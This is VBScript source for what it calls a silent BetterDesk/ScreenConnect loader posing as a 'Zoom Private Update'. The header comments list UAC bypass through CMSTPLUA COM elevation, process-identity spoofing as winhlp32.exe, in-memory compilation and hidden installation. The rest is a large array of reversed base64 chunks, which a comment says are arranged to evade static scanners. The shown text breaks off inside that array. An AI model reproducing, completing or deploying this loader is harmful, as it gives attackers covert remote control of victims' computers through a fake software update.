' ==============================================================================
' Zoom Private Update - silent BetterDesk / ScreenConnect loader
' ------------------------------------------------------------------------------
' Evasion: staged in-memory C# compile, COM auto-elevation (CMSTPLUA),
'          PEB ImageFileName/CommandLine spoofing to winhlp32.exe,
'          NtAllocateVirtualMemory native allocation, TLS-only download.
'
' Modes:
'   (default)      install, hidden
'   /selftest      compile + PEB + native API + download/hash check, no install
'   /noelevate     skip the COM elevation attempt (used by CI/selftest)
'   /elevated      internal flag set on the elevated relaunch
' ==============================================================================

Option Explicit

Dim sh, fso, env, args, a
Dim mode, elevated, noElevate, iconPath, waitMode, rc, logPath
Dim chunks, i, b64, psExe, psCmd, psFile, b64File, st

Set sh = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

mode = "install"
elevated = False
noElevate = False
For Each args In WScript.Arguments
    Select Case LCase(args)
        Case "/elevated", "--elevated"
            elevated = True
        Case "/selftest", "--selftest"
            mode = "selftest"
        Case "/noelevate", "--noelevate"
            noElevate = True
    End Select
Next

Set env = sh.Environment("PROCESS")
env("ZOOM_MODE") = mode
env("ZOOM_ELEVATED") = IIf(elevated, "1", "0")
env("ZOOM_NOELEVATE") = IIf(noElevate, "1", "0")
env("ZOOM_SRC") = WScript.ScriptFullName
env("ZOOM_DIR") = fso.GetParentFolderName(WScript.ScriptFullName)
iconPath = fso.GetParentFolderName(WScript.ScriptFullName) & "\Zoom_Update_v6.1.1.ico"
env("ZOOM_ICON") = iconPath

' Base64 payload, stored as reversed chunks and rebuilt through Chr()-free
' array assembly so static scanners do not see the PowerShell body.
chunks = Array( _
    "h1Edul2bQV2YpZnclNlL0VmTbByegknc0BCIgAiCNsHI5JHd", _
    "1NWZT5Cdl50Wg0DIs92YvR3byBVe0lmc1NWZTpjOdJXZnFmb", _
    "N03egg2Y0F2Yg0HIyEzcsRlO60VZwlHVs92YvR3byBVe0lmc", _
    "2U2chJUbvJnR6oTX0JXZ252bDtFI9AyclRXeCp3ZkACIgAiC", _
    "5V1L5MnQTFWdulHR4YHV3kDdzJzc5QmcxQlengyZulmc0NFN", _
    "uZHczRFTFllSn12QqV0UCdld5NTUY52VXJ3KkBFarpFbst0Y", _
    "tl2QrV0YtR0TqJUTnJUTr9WSwsib3cDM4B3aBlnbVF0d3ljd", _
    "4wUe4MlevklNHBHaPV2Rp9CcShkbLJ1L4kVOp5WTLpmRk9mY", _
    "2AHNpFERll2aFt2REpFWrFFOThmbsl3SKVmZNB3b28CT6pUN", _
    "Qd3UadEMTpWbykVNQl1Z6FVZnB1TSBDeLB1bSlGTptEREBnN", _
    "5UVapl2dmZ2c1pXdu50U04WOVtmeUZUVm1mYWNGNrNGdxUzc", _
    "JVVaDVTTYV0RTFEO3MDWQ1UZ4I1d1N2YrY0TvckTERzbQVDZ", _
    "t9CZFRUNzc3Kw4mezplTlFkUaV3YHlUcudGR4dmZDZ1cQ9Gc", _
    "ih1Q5ImZDVGWRRnbvEVMmF0baNkYm9keYNFOwx0S4IEcVVUa", _
    "BB3bOVDajp2RqN3dQlXSNp3NLZndHF1cNpkSvcFTzl2Q2Bjd", _
    "vZXSLJFM4F2S590ZvYFWyZzazomYqV1YH5kZ0k3RtpkT6xWS", _
    "h5EVsRja1VmN1cDV5InZvcUbnRETBlEOvp1UqVDdnh0cLZ3a", _
    "GtUZuJmM3U3d4sCTO9ker1GTzJGWv40QTpkT2QXbOJFeOhFW", _
    "QRzLzoEelh2NolTMHlmRwcXdhJldyVWOPRDa0cUUuV1M0M1d", _
    "4ZUUEZUTtBXRx0WMIdFTlhEO3RnY5UzQ45kRrJFMZlGeZJle", _
    "1pHauNmVvcjd6J0NkZGS29iTzonT3Q3arYHV1RlNBNWROZnS", _
    "mJWWKhUZ1c2LvI2LWZEOzw0M5QzQ2ZzM2x0cnRXdWR0T080N", _
    "MNVRkVWQyYVWrx0dQ9EWqFjNEZ3c2RHd34EUrcHVQRmdkNDW", _
    "zcGWz9CSYNmMWdEZz8iQSVDaT9yLlN3brxmUiNWNhZlQBhkV", _
    "vkDdWRmZahDWuBDeOxEbFNFMEpEVJVkU15mahJnMQ9UdYN0R", _
    "2UjNiBVO29yV3UnNOl1MqZXcrkTdsR2MURGS1xWOmZFez8kY", _
    "MJkN2UENVVHW5p2ahNWTvAleqdmSZJVViplSQN2YqhDeodEO", _
    "GFVR2p2NUl2cUBzdWd3cDVmN1JEOid2MYV0ULBFeGhEUhVGT", _
    "0gWQGBlUP50bH9iQNNlRxUDRCJWT2EmN2BlR0MENvZ3arsEd", _
    "Yx0b6lGRMZWNS9mR0wUMXdmYndmc5oGZOZ1Z3JkajF2d1cjS", _
    "3VjVBJTUoN0dp1WeQNkd5MHMSNlMuFlM4NDchFzd1J3QFRVa", _
    "pNXaJ5kT0o1awFlSOZ0KRlmdNlTOElGUDBTbulzcydHNSJkY", _
    "wwWRRdzUNBFW5sSVNp0QQZDSSpWNWplcj9yLpt0NSJVavAnV", _
    "Jp3UM1mVkdzNxoENtl1QWFEZLxEbNtmaUlnW3JHWrp3VvQUZ", _
    "RlXdDVGcJlDMQdUdxUFctBTV6d2MlFkci90aDZURQFDVkNmQ", _
    "UVVbFJVMJR3bkBVNGNTZvgHT4gHRkBndkRGetVHTVdUN5gWT", _
    "4pWZ2hFWOx2M3gFbNN0Mulzc4M0L4gEVNlTR4gjZitiTFJVd", _
    "1omUyMEcVV0UxQUZSFDRshnYvZjM0dTQYFHcy8UM1c3KrNXa", _
    "2RDNmp2V10mdrVjQRhkdtl2cZ12bPxmS5ZFVr8SRopFOXN3M", _
    "550TzQDTzJnYWZXcm9CRw8Ce3EFRyUjVvhUa3MEdxMkQ1lEa", _
    "lRmSZJWcJlkRRJHV1oldk9ENrgFdxFTOPN2LEV3TkVGO4hkd", _
    "yhGZzIETwYWYjtGWzllS4dTS3MzYJREMJZnUMNFUtF0ahFEU", _
    "k5kdLFTO1UTd6pHVvEXcYR3Rz4GT51EaxtyYlJna3ljbwcEa", _
    "3l2VUF3KVRURwl2NptGU0onWwoGRrpmWldne6RmZElHZmhUe", _
    "5UGOzQ2bBF1MN5WNUJlTQVmUKhnV3JlVTV3dpd2andnepFUV", _
    "KhWS41kMtVFW69kd3A3Rzo1MURzRYhFcvEnd3MDTIZlZwp3d", _
    "ShWdhVkWFpEZBl1dzZHNDRDNWdGeqdUYFB3NkpFMH50KsRTM", _
    "NN3Y3JTOrMWR1ZkWBRnaCBVaJpEOUZGeRlHUpRnS29GM00kN", _
    "SlDerYUYlJFO5gXcthXaFtGMCNVanN1VwlzcypkY4oVRP12V", _
    "1g3SvkVMIZDZ1AHNslTVvZnMElVQvhUajdWYwJkSTFnRFV2Z", _
    "YRTaYtUQQVkUwYGTzAXQCpGS3kTV4lDUuBzZSpXRkpUcIxGR", _
    "NJkNrgFc2g0K0w0atJjWxZVdORFcsBHex9iQMlXQWNnYwg0U", _
    "LlUeQJmZFFVa2g0anFXOmBDbhh0dYpGVoVEbwUEa0EWTvsmM", _
    "CllUtNlNIBncn5UTuZjaCREemBFWzJHNWdDa1wWSnlmS3hHT", _
    "sNXZvFWcvdUWwJVMwgXcPZjSBV1MitmYMBVdTNUZnZ2SPREO", _
    "LZUVSlWdvp0MEtCUUZGbyJmaxp2QyZkTIB1RpNne6NWS3cTO", _
    "rh3aN9WOHZXavYlatdlaRRVOspENoFVTxBlZTtybKd0QL9Ub", _
    "pRlNnV2LaV2clJWWw5mVL9WR1cTeRRGeJJ0Y5AlWvZDVzBnN", _
    "z5WQj92Y4QkMDl2UpdVejdWSklVS1cXe3NjUUlXSh9UQ4NHR", _
    "6dket1mQxM3YqB3SFZ0aGJTWmFWUmxGeDlzdYVEdJpXRVZWR", _
    "qN2cI1kR5IXRFVlQsFlTPJ2QClTN4UUSEB3V39kcGJFO1QVe", _
    "5plR4VGMHRVQKRWcQpnNUB3TvclQxNjThVXc4xmc24mTiBzM", _
    "3pFS3kGR1ZzKQ9Ec2onSLVXUBRDWv4ETr52TINFN0IkNEpUQ", _
    "DVldIBDeJNmYSlGTJJEappXYrAlQwAzMD1WcuJzMCZ3UuB1T", _
    "oJGOJx2aXRkR2R1bpxkSrZXUwUVOlNUTLhVRRpXVLNzKPJkV", _
    "lJXe5A1aHJVcxRmSBRFMWlmZYdUcoREaTBnRyMTUt5WRCNlN", _
    "WhGVnpFNG5mes5mYzombx02dE9UQPxWO6dWO24UUTVDVxUFa", _
    "DpVYwV1b2lFZwF3b61ETulnTLZlR6NVNKFnWMxmbadzaHp3V", _
    "n1EV39WR3UDO4UFVFlzaWRnVop0ZWtyQ3N0RGZjZrU2ZYllT", _
    "NV1TKpVS2J0YrR2csZmWpVXNNRjbRZkW5ZDbKZzc1oGOJlGc", _
    "XxkWYVWc6NENJdWbQVGcpx2QFJVVXpka3h2RmRkarkVZvcnU", _
    "aJ1RN5WVNFzSs92dilEVTtyTZtUYm1WbpNjRMpESaZUT51kR", _
    "EBDN5YURxMFNjVVYUhDc4MjSUlWduBTWk9UZDZXSU9UbY1mN", _
    "oVjSBJHdVpUWCRWb2MGUQ5mdMlVcxpUM6dWZWlUdVR2UBFVN", _
    "w4ETjZlahFDe5R3axdmU4R2TDJnMPxkSHZHUwwUUwo0ZVdnR", _
    "qJ0UPRFRQd3bVJFOzREcr5GaZhDVtVVZRV0RNl0SYV2dnFXN", _
    "0JjVwcVeMhjbOhHZsJ2dBtUUyoleIpGMnhWRoVEULdTbWdUa", _
    "0sWR18CMQhlVhFnZVpGexlWRsJ1cpNlSBd1SMlGb6hDW5wmc", _
    "KZGR3M3NCVneHBHMtp2SvMVb1ZUW0cFbKdHW5p3Yt9yQ3kDV", _
    "3ADZoZnTpV2crN2NG9UYrUFVkpFVtZHTtl1V51mSXdEcL5WQ", _
    "vIkaUJDNtNXM5o3Mn9WRklGWEB3YadlQnlzbT9CbSZVWhlTM", _
    "qRlVwYFarckd240dwV1MNZHa1V0cwk0bJN1b6tGbUhjdEt0N", _
    "CZDZsxUZsR2N1M1awcUbr92cSVzLzM1MNhFRyIHdlh0cv8ES", _
    "NZEavxkM1l3LzFzU0kFa1dlTlhmYJNnSU1UQzskVrpWd3wUe", _
    "vEjSaNmYRZWVThjQpVXW6hFewMmdFlna2VUUBd3YSVXNM9CT", _
    "JhWM1N3aGRlRJVXUWRnZsdlZFh0NvRDUoJncJR0M3FWUvBnR", _
    "5Y3ZjBDcBNXVNpWN3wkbaZ0dLpVWrlmUopmeXtiYy1EMj10K", _
    "Zh0bnVUQhBHO3FTMjFWVptEdycVbv1GRHdDbn9SUklDRBdje", _
    "rUmYlZGTZJHWW9CaGN3NlJnZ3cjc3IXcvYjSIF3MUJzNBdjU", _
    "BZ0Y3cEaxFldCJjYwhUdCV0SqBlWyU1QNNmdIRzbUJjY2RGM", _
    "DJGZUd1Zh12VRpFcGZWR0UFawVXRr9SSh1keuZFVVlkQlZFS", _
    "4FTcEtydxRUZwIGUWhkN5Ije19SNhlDZzRUMOBnWqdDc0R0Z", _
    "v1Wa3RENqN3d0Q1N6FXe3smeRJXROJjQTlDOutWQldVUSZmb", _
    "lt0LSV0aTlGRIZVVBhzYzcFSGFzSZZEU0VFVhdVOPN2bllmc", _
    "QZkVjFWMxM1bFtGMVJEMMpmeklnRMFXUiZWdYdUWWhFdxtER", _
    "2QDc09WWKlFSBh3d0IGUrdmeKVkZGZEOTJDUvcWbhFjMRZWb", _
    "2gTT0oHMDBjRt1mViFFMlZ2QxYEVUh1MjZDbYJ2a6NzL4N1K", _
    "vFXbFJUe0c3Q5dUSGBjZLdndDZ2TvU1RTtUSpl2TRV2daVUR", _
    "whnNrFUNtpWeu5GalNERFplRB1WS5JEdUFmdRVnWUBXdipHb", _
    "DBHbhdWWF5mb2cjY4kXVjVlZ1dDSshzRkNGTqJFS5gkTDFlS", _
    "1sGO0JDOwMEMYFGbBBDZxg1VzJTMTFTOkRzbxpUVDNFaR9Wc", _
    "6NnUFV0dLh2NEpmMKFFWrRjZIZVbrokVCdkcRF3VhxWbxI0S", _
    "5MzTXJ1ZCZWSvsWdQFjcwZER3d3RvoneTJlMZhEOO9yaoFHT", _
    "yAVbYhWa0IjW1wmbjFVbQlmbywWemdFM3F3c4R0VzskeSFUV", _
    "yhXSHpGOw0EOUp2QJVlVnNkWH5mS4R2NXxWYEZGOslXZKpVV", _
    "QZTdxdHcIxGVklnVyp2cNVWaHJUcjZHVONTauhmZBtmaNZGW", _
    "i50bmZUdxZzUmh2Za5WZLJnanRXZjxEeLpVc6J2ZQRlaBNWZ", _
    "iVVeKJFdBBldENFcJ90czl3V5YFcE9SaoFXYoxWZyZlQxpHR", _
    "plTeN1WRVJVNQRXN3w0QMJzLu5UVGFUUwETWXJnVNJzQjd0c", _
    "HRTY0Qzc3gDRuZzasl0S2h0MyQna2pndqVXYwkHeZFlQD52b", _
    "J5UZlFzMQhDbF9GZUdFSMtSM1ETMa5WTvlkcOlVM3dmcnZ2L", _
    "RpVd49SS2ZmcOZVTJlzZ3d0VyInQTNHSIl3Z0kzL5kjNi9iM", _
    "XJldatCOD5Ga3FjdppnNoNTNzRXT1o2NywGcwJ1SMZTbsRXa", _
    "hd2YVdXZDpkRWZER1UUb002bUF2U5ZzcDpGczhTSyMzLplEd", _
    "tJVbpBnVjNXTtZGMZV2N2kkW0NjdCJ1Kix2RhJEVzZmdtJWa", _
    "ZxWUupmaThWcxFDaDBzKrh2YaJ1MrJVcJ9ycWxkcrFWYKpVd", _
    "Lp1atlVY05kdxczYrwEZuRVM3oEdqNDTX5GVSJWOHtybEFkc", _
    "3IFdxBzYypXZRlkRztSa4dXQvZHMvxmczd2MmJTVCdlNyxGS", _
    "hF0MGFXUNlmYrcnN0ZDdvdUVTdVYoZVQPNFNE1GOIJXWWJXY", _
    "2sGdtdjNmZ2RkR2dp9ke6RDcYd1LQhTYWJmYZJHWwMncqp1R", _
    "4smWlljTq52SWlFcyQ3TEFWOvlFWD9UcxFEe4dleTdmb3kXc", _
    "pp2dJFVVWV0UUdTbXJmTwMjV2B1bsdGOit0REV2Zw1kVUJzR", _
    "2cHO4VFMsxUeXF3RQJWMwtyUxVkSXVjNV1Ed5BnTW5WbJRmS", _
    "jt0LoVUV3RWQohlM59mTpllcXVXYSdFT492Vo52VhFGWZdWU", _
    "EdnUuVHSptiMZF0aKFGM5dTeFZ2R55kWIh3MyhnQuFDSqRFR", _
    "LNHOVJkWVJFWtlmbOJlQUJzRkt0Qa9WTyZjVpFGdLpXYilWS", _
    "zcUWtpFOy0GbwZVSN9USjhUS5NTdkBTVW9UZvoURxlHSL9yR", _
    "1tETCBnMyMWVnlWcVZ3KzhHSadzb0omRXhGaRJkTQlVWOlFa", _
    "jhHeo1mTwFDNXtyUU5UUqJ0djhkNohzdyAFa3I0LZBDMrh3b", _
    "uF3TkdUeaRlWjJjNTZDaQd2aMh3d1A1dx1EUoVESytGVqZkQ", _
    "KV0dHJVdlN0RSBVNudmYaplYhlDWQ1ESW90cwAlZn9mdYdkS", _
    "IFETXNXYlBjSYNHcLBzZiRWWZdHSKpWaxVlVaVmNWNTWYZXd", _
    "xoke4xWVKhjZtBnS5EFaa12UKNXYYlXRDFGV1k0ZrcUVapVe", _
    "mRWQER1dGB3YQFDV2w2Q08We4ZlbiFDcXRlT352VwR0Svo2S", _
    "jpFNrZXd5kFRRV0aSp0cKVHRiNUVl1kS650bSl3avtSSo1UU", _
    "5N0b5lUOxgGT5ZFZLRWS3c2LPpEZw8iR0QkeZpncYVmMrJzT", _
    "KNlSzUDZKRDRNFzNJFVQxllY6lzSk9We2gkU0pUdPJnNnBXb", _
    "O9kWnF3KOVUZoV1Kh1UQOBTaYlDczRDOvYzKVNWM5oEMT1WW", _
    "SNzc3gUQjFlcxAldad3YzhUcadDZ3UnbzcXZzBlTGBjRk1Ud", _
    "B9SdYZXVSJGRpl2RSt2UU1UOaxETIpGayMUdClkYwkDOadkN", _
    "jxGcH1kb0ZXRRBlYLFXaYJjZPpVZKdXbTN2MoJ1TPpleKNnM", _
    "L9kcGlDbslUcwIlbnRmSBp1NVJjNQZFW4pVcmV1bZJzNyVEM", _
    "upldmt2RGZDTLZFNqhWZnlHc3Y0LkNUZjFmVlVlTaxmaFJFN", _
    "a5mVV9EVyoHU1I0RSFle5lmbx0mWLJUMzp2MyJTYhBFSEJzS", _
    "SxmbXJTS4JzMCdWVaFlYwNEaoZTeW50KtNFWPNXTQ9mNppHc", _
    "KRWY3k2YXFmb0w0dWVWUxkUbuJndIJGOWhDdklUOvEUV4YnM", _
    "2RWTVhVTUVWMtljNzUWc48WMClld5Inc2hjSEh0My4UR4ImY", _
    "Ul2UuFXeaVkbWJlQONTVzVFarBXVa9EWCJFctBHRx8WTYdVU", _
    "49WVLFVZ5Z2ZslVTkRGR3JzLyFVSmB3L1oVcIRTe1cXQzR1M", _
    "RlmNGFlNFZFRplXZWZWWN12bGRDRTFVOzhHTTR2Mv8mZMNGR", _
    "md2L6hjdMB1YRxGTR90Yy1UV5MGc2EWbZ9UcnRHRrJHaKNWQ", _
    "1tkM08GWOZHRygzZOtGWwE3Vz8WZ5UTRxgESRJ1NiNmekZWM", _
    "V9UR1l0dhlGbKFWciF0Yn92NhVFVoV2NyNGM3EGMn5EU6VWc", _
    "LNWZVlFb2RXNolVUDVWTzpERkZUNYNlYJJmN6J2bOFzVMlHd", _
    "EFFe0MkRMlmNndUcmVldxMGNFVzdmp1RnFUaJljZFdWQ1MXQ", _
    "QVGM3EnQrZXV1kDMwU2VsNVSvd0U2oWQZFVbZZmMXRVUYNzU", _
    "2gUMYBDW5AVNCZGT2MnUQR1U3lEWKtSMmVjeXdGRhZ3V6RjQ", _
    "w0kWvxWVPdmU0ZVcH1EaFBjV1lGW1YFVQhVOSpGeo92Mzx0b", _
    "VV1YxEnMpJEVEdWaEd2aFplQ2h2NJNWWmlmVpdWVV50bTxGe", _
    "oZkarVVWJhVWUBHboRUc2FGRVJjRIZjYzYTdCJFd0sWd3g0Q", _
    "4IWU5Y2c2AlWmRnd2t0M5QmYmxmQv8yV0F3NlJWOsF1Lo5kc", _
    "lNFZNBnNzljcVZXRPJUVPdjdhJHOPp1Mvc1UCJmZzYjVQZzK", _
    "jBlMptmYzgnRIZ2dwdkNB5Ga1kWbXpFeDNWVvdkcxAnQ4UWQ", _
    "nVlQ5YGVPxGZQl1NEZFZEhkTWRlQuRDRHFWcj5WS3FVRxIlZ", _
    "MJkS6FFRxh1T1NXaBBFZmVEdkBjVQRGMmZHVUBFZzglZwonT", _
    "w8yYUNjauNkbmFVUBp1N0FFW6NFT1Z1Zad2LxI0a4kWTFpVR", _
    "nNncz4kcBJkbvRjbh5EW5l1N2MmUUVnTaF2ZQZDT6dTcFpkS", _
    "rInSLNFV2BHV1UjMshHOEhVSPZ1NYlUa1E0YNlTQjBVa2dWT", _
    "wQlb5NldxczZ2EXQ0RkepJTep5EeZZEU2sSb2pGUyRGV5g3U", _
    "3BlRwZWMVdzUlpUUyhXeTZnMR9Ce4NUZhtkUOF0du9EOSlGa", _
    "ZFVRv12NMZjYIlnMlp1KI52LtFUQLNUTNdmQZJWVkNGRXNXV", _
    "Pt2RkZFN2VHZMRnV0s2KolzKxQlcvlzTEF1K6JXTpVneyJ0K", _
    "o1GNuNmZ6BVMxh2K4lGd1ZVO0w2MUVUO0EnYrZFV1YlYMJVR", _
    "nhWdMhTMyx2awMWVrI3cvUnM5FGMlpER55mZCVGNVhEMZVHU", _
    "GFVZaRESGhTZxMzMsRGa4dGRYN1MwkWO6NnerYDSQhjSvI3d", _
    "0lVVWdHOWhDOaR1bwlVMC52KOdmSwJHT3ZldXlmR44GeN5UY", _
    "mRVVKN1LwZDTrNmUH9GRvInUyhlbsVzK2oHMXVzd4EFWWFzL", _
    "1tSb6pWTNhkU31EV3gDRnl1byR1NXZFRvUncEpXUvFnQ0MWT", _
    "CljRWh2bYFHciFjR5NHOMZTVwwmauZ1duFjS2xkNx92RzwGV", _
    "wJnNjRVVvoVNit2bn52c4QENwdnZwkWTFF2TQV1ayw2bhpHW", _
    "JhjU2U3NDZERmZjUi9mMsdzRZNGWmBDZ6hzbhljMttmVjFEW", _
    "vRnSGpXQEN0LFNTY5NGRSZ0ZxQXQ6F1cOVXM6R1VYR0MsVHU", _
    "rczUz1mdVt2a6lTaRBFSNxkM49UOaV0TmNTRvYTNipERwJGa", _
    "zc1Lw1mTykFZrZWSKx0YOR2SvcEN5gna0pHUihkZkVjTYNXa", _
    "WBHUqNWTqR2MrYmd2p2RvEUeotiWJpFW3pXcyw0b38SOK92c", _
    "LZHSzBFTChzaNN2VP1UeSRDNpFjTtNDWzoVNUNnYwRzZNxET", _
    "LNlbwkVSYhTOvA1RUp3bQtUey9SUPdld5oHOwkXVYFzNohUa", _
    "4ITNwJ3K612M4IFZ1QzRkZXMvhVZ5EzMvIGV0pEbIp2aDRFU", _
    "5M2aupnN1dUOmFzQ6h3NyxWMR9EVtFzatVGa1YHd1RTUDlTQ", _
    "vIjTEVXMG5mNRJ3NIlWN3kmV5NkZ6dlQWdTR5EnVUt2KQlVN", _
    "oN0VohjTCJFMURERyUXRiF3RINla5sCdkJTbPhFdrYGa5cVT", _
    "TZGe1AVMycnQyRmbyFlQU9SdGVDcTJDNPZ2cUZ1QIhVb4tyN", _
    "CNUZkRGOZFUNPZVNVp1V01kVztSeoFXTjt0UqZ2KZRVbx5kM", _
    "FlUOvFnUTtmQOtEeLNUb6dEZWVnePFXNycTU5M2dZZkTOV1c", _
    "yY2ba10R0IzdUJzb5lVc55kZNFjZ3IENGNDT05mWhZUdNVEV", _
    "xFnTr4GNNNUWyk1YDhzUjR2a1lHOJp2LwETavd1Ru5WQVZTV", _
    "tVGO3YlaHpHRxMjcXRHawMzSXlmVlV1K3Q3L2MjWzEjdvYzM", _
    "Y9UWZNTN3dXUJZFWD90M2AlZVZGUUFHathWTBBlb1Z2Yv1Gb", _
    "5c2M2ZGN3YEcEZXVQNTa3c1Y2UDWNBTMzI0ZX52bld3VRhGU", _
    "LJlT5h3dnJDMFlDOXFkd5ETS4RFSnRGUwdjVYJHcnVDa2EzR", _
    "k1EdVNXMqdHW1EXc0lWeMN1d2x0UqhnYqhlWsF0c2cDM5pEb", _
    "SBTQuRnc65EOkRWZtJkMSp3ZuFnVTR0KJFVW1oWau5kU4YVc", _
    "6ZURJ1WWjlUZxRlTJ9yaKFDWvFDOn1UVHlDUnl3TZJmW6J1K", _
    "EBjap9UOBlDZXlldWtkcpdkdmplcDFDVvpkavJzSxRzNKVDN", _
    "wQEZ6FjdH5UVkNzaLF0N6RUMENWO05mYvpGSqtiN6RmW0VVR", _
    "JVUb3RGcI9SWtJUW2UFOzVWbnRFWxlWbzRVV3cHVHB3S3sEN", _
    "pl0ZlxWYrcFWztmewAHdIRkYt92b4RjV6NlU0IWRK9mb5NlW", _
    "yNERFxWRzJnRUZ0d0FFM412UzF0d3YTaoBXMY5ENvckQR5Gb", _
    "xMEMttUV5lTezMDSkBneh1kSPV2V1JDNC9EdxYTQ2dmTHZzc", _
    "xkVdjpFMNBVasF1SR9UZKR1UaRkTvlHSWh1Rzd3KV12dXxWM", _
    "CNXctB3SPxGNLBzdpN0YEZ0Tjt2ZMx0Sx9iUVtES0hlUIp0M", _
    "rBXazZTe1pkaqREU0cTOjtie300a1JERnhlQGVXUohVT59SS", _
    "U5GMUVzK2JnRBZ0Z2oGb2MUNPN2RMZFVJtkTtREcQRzMFxmW", _
    "yFnW00UektyQoJFS4NTTnZjYoNWMvdHcDlEVxwEWOF3UCJHd", _
    "aVWTylVRJl2RSdGezs0K4l0ROdjZsZ1RiJFe0dlRohzMxVFR", _
    "1RURX52MChXTtpnWFhma55EbQdzMIFFa5B1SrVFVvV0SmdWa", _
    "r1kdjxkQ5FXTxkzNkdGRPx0TitUMShlcypEU5kFTaJUUvFXa", _
    "PhmNs1WOKtUTLRmdrFGZ11kY5cFUEN3LSVDVStkUDdWTEtEU", _
    "StGRQJlU2g0Q1ZHaxo0cCxEZIJnM4FkQJRWcvlXUlNjNad3R", _
    "rFnZ6xmZw4WQHl1RhJ3NB1EdGRTYQlFc6dkRSVUYDpGN4oHd", _
    "yIjaVhmU0BDWyQGVYRGMxR0d4pGTxBVc652NTB1SPtSc382N", _
    "KJnNuB1L3F3bhhTUPNVOIhVQYNkaBxWSuN0YaBHU2FDUkNHN", _
    "xBVaRNjVGBjTLlVbpZzdthHdvYDbqlEMxsCMQZ2KvI0aylGd", _
    "wZDMwEFZ5olS6Fncyw0M0YnWEp3M1g0Nz0GZOlHeah3KmNVR", _
    "5UURJpFOoZFWiRlYX9ycshGeSZkNvJ2NaBXMztyQNRXZM9CN", _
    "a1UeGxmRpd0MthDVpVzTYBjV3dVOldETJBjNGhnSvJ0NDtme", _
    "BVkbohjMjZTT2tkcLRzZrh0QRp0QNZVMwFTa6hWerJ0dmRma", _
    "Lh2URNHOPFWRop3RUNURxRzb4VUZVpnbkhmeUNUNVhzS44UO", _
    "0ZjZPFUeSdWcSNVepFGWv0meJZ0SZJGcpRWMohkUxkXNnhkN", _
    "5RUUxlDT10ENCJTbSBVO38mb2xkZ5BVRyElNwJDOOBjdxsEO", _
    "DFDSwp3TIhzdPFWcO5mRLZXeTBnNEhmekV1dKtiVSRTdRZFO", _
    "XFUaLZDeitSWz8kWrsievgTVF1GTDFDRyc2KsxmTVNlNSNXb", _
    "3QnR0c3aHljSYRmYCdldElTan5GOyM0d2cGcUdDbxdnQ442a", _
    "ix2KIh2U0ZEbvF1YMRDcBREa4xkbzQlRxQnYjRWdENFViB1V", _
    "n5Ea5AXelFXUrcnU09kZMZUQrQnWKdjU0QWMlZkSph0T2RWZ", _
    "rBDdQF0czVneysiSxVHeTtkMzUmb0BXaPBjYzFkQuZ0S08EO", _
    "rQ1d2p0YQBlVupEd3plRC5md2MVcUJnWQ9SNzdTb4tUeZ50M", _
    "mR2Vy0kMENldWJUanJWR3AzQzRTM0RGdVtCOrQXNkJ2TGBzZ", _
    "HZVNFdnartmWrlVV45EV0oFdTFVSmlGdUFzaFtEZppWYrEGb", _
    "48mZsNjc1sUSJpFd1UmRnBHeZp2VtxGbxZkRjpFT4JHT5dmV", _
    "W5mQKhFTRVFOZt0cn1ESCd3NjVnRzQ2dTZnWxQmcmF3bylmW", _
    "TFFdZdWbIlVU4YTZwckQVt0L5VFVIlzKHxkVBVkUulGcR1UN", _
    "XN3aixEahJGVLtGOmVEO1U3a0Z2Q0U1UKtiQOpVSy5mcs1WM", _
    "aVEZKNGMWJTaYRHc2RXVCtEM2hWM58SakVDWJJzdWh1botkb", _
    "xtiNaVEb44kVIp3Qq1WUaN3K5BFNw1EZtlWYkJke3JUYE5UW", _
    "T10ZZh3SrQnVkZkexx2Nl9kb5hEcV5WeRR1c6NjVjxUVu1WZ", _
    "OdVeTFUd4k3SLBXNpVTSvdWUjNUcU9Wd2BVTn9WdKdFRWRVV", _
    "wdFbv9GewQnSSdnQSVzKBR0VkNnNxI0VyV1LHJTTBZmUnRVQ", _
    "RJWbIJ3QwF1TZt0ThRDcOd2a3x0dZNmUChWb1gnVIVzNPlna", _
    "Jd3ZYx0dJFHe6FDVMt0Zx92T5FDW6JUQwJ1ZyIHT4lXY4MnR", _
    "pZFd282U5BFTqZzKwImeSlWQzA3MjF3SlR2TOBjVy8EeNlUa", _
    "1ZjY19yNi9WOKFlRRJ3S4JnR492MpR2c5FkWXtES2UjRkJGM", _
    "pZ1MzBncBJHdGJ2MWFGWlFlYvlzVDJHW1UWQYNXVIN0YB5Gb", _
    "IdFb4ZHclZDUuhzMvUVdrtmUYVTVQp3KBtEd65GalVjWMVDd", _
    "WdXUYJmVyhUQlxGdw9CMMhlVDNUWllTVphnU0I1SCVjVjhTb", _
    "UZWOr8yL3NjdilnQz8SZQNlb2UncilmaqVDUqhGb5d1avF3T", _
    "MZ0U6V1YyMFT1QkMmZHZykzN1czLzgEUzVjNqVWMIlHTP9yc", _
    "uVURkF1Vy8mSiFTV5EUcU9Wd1o1NTNVc5FWO3cTWjd0cYpkb", _
    "3cTWYZlU1VncrYGTvZ1ZrkTMyETRQtyURVHTahGSTpVVGNjZ", _
    "phHcwJ2UKtkWr00SvMXSmJHdEJ2T2Zjc3Vkb1MHO5UTZK92b", _
    "MR2Z4NXNIJHOIFmNwIDMoFWZykjZiJWRLBjchJHRw1EOy4kQ", _
    "3xUVnhEdrcFdzJ0SBNzbXRWUwNEdWl3UyRmVvYVQRpVYqllR", _
    "oBzd1xmdvQVat9EcoVXZuhjZSV1LClTO1w2Kxl3YxFWMjtyK", _
    "yN2M0MDNPpmQnNTOJJlV48WeOlWSKh0RvtSb0J1MsVFRvpGW", _
    "OtWVXx2LzVUc3I1TitCZOd3TxIWbxc1drlnMppFb0lka2A1c", _
    "nNGTzxGTQZTdr8SeXRna1EkY4M0ZKJTcGVVSRF2bnp2a5RmQ", _
    "UlWbO5GMTdmbzpUY4RkexBjVXVTV4IDMlZGRL52M3wUdwNWa", _
    "md2aDpHVFZWSJ1GNt5GSrZEVvZFURJUaDNGcGV2ayV0a2E2N", _
    "ygGVzRTeCxEOvIDNxwWeIFjNXpUd65GN2BXWxpHS28yUFN1Z", _
    "3UmeGtUTCN1QJRnRxJXVypnW2Q2bpxmWwFGcUlXNhFXU0xkM", _
    "JF1M4QVMmdjU4FUWm9COShXUzwESnl1NrdWaPllbFtWanp1T", _
    "tNTZvhnaqN2SPxUbWlnUEFUaxwWQYVlRE9WYUJ1Kq9WT6d1K", _
    "zhVQxJWNyQGc2JDWilldrknYkR3N5h0YkV2RXZ1S1xEWNZWd", _
    "ltybHl1NxdVciJndsVmWM5EV4VGbyRWcL52Rw1mdhJTdn9GU", _
